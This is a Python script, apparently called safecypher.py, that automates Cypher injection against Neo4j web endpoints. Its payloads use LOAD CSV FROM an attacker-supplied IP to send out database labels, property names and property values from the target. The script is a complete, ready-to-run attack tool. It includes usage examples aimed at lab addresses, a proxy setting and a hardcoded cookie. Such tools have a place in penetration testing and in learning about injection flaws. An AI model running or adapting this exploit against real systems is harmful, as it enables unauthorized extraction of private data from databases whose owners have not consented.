import argparse
import requests
import urllib
import sys

headers = {
    'Host': '192.168.17.158:3030',
    'User-Agent': 'curl/8.5.0',
    'Accept': '*/*',
    'Connection': 'close',
}

proxies = {
    'http': 'http://127.0.0.1:8080',
}

cookies = {
    'x': '17ab96bd8ffbe8ca58a78657a918558'
}



def inject_payload(target, payload, request_type, parameters):
    #injection_characters = [["NONEXIST'", "Property"], ["-1", "ID"]]
    injection_characters = [" ", "'", "\""]  
    for i in range(len(injection_characters)):
        full_payload = injection_characters[i] + payload
        encoded_payload = urllib.parse.quote(full_payload, safe='')
        if request_type == "API":
            url = target + parameters + encoded_payload
        elif request_type == "GET":
            url = f"{target}?{parameters}={encoded_payload}"
        elif request_type == "POST":
            full_payload = injection_characters[i] + payload
            url = target
            data = f"{parameters}={encoded_payload}"
        else:
            print("Invalid request type")
        try:
            if request_type == "POST":
                response = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, verify=False, proxies=proxies,
                                         cookies=cookies)
            else:
                response = requests.get(url, headers=headers, verify=False, proxies=proxies, cookies=cookies)

            if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                print(f"Injection Character {injection_characters[i]} ... Check your listener")
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")


def exfil_data(target, exfil_ip, request_type, parameters):
    print("Dumping Labels")
    inject_payload(target, f" OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://{exfil_ip}/?label='+label as l RETURN 0 as _0 //", request_type, parameters)
    label = input("Enter Label: ")

    print("Dumping Properties")
    inject_payload(target, f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p as l RETURN 0 as _0 //", request_type, parameters)

    print("Dumping Value of Properties") 
    inject_payload(target, f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //", request_type, parameters)



def main():
    examples = """
Examples:

API:
python3 safecypher.py -u http://192.168.17.158:3030/api/neo4j/characters -p /name/ -l 192.168.17.128 -t API



GET:
python3 safecypher.py -u http://192.168.17.158:3030/api/neo4j/characters -p name -l 192.168.17.128 -t GET


POST:
python3 safecypher.py -u http://192.168.17.158:3030/api/neo4j/characters -p name -l 192.168.17.128 -t POST
    """
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j", formatter_class=argparse.RawTextHelpFormatter, epilog=examples)
    parser.add_argument("-u", "--url", required=True, help="Target URL: http://192.168.17.158:3030/api/neo4j/characters")
    parser.add_argument("-l", "--exfil-ip", required=True, help="Exfiltration IP: 127.0.0.1")
    parser.add_argument("-t", "--type", required=True, help="API/GET/POST")
    parser.add_argument("-p", "--parameters",required=True, help="Vulnerable parameters")
    args = parser.parse_args()

    target = args.url
    exfil_ip = args.exfil_ip
    request_type = args.type
    parameters = args.parameters

    exfil_data(target, exfil_ip, request_type, parameters)

if __name__ == "__main__":
    main()
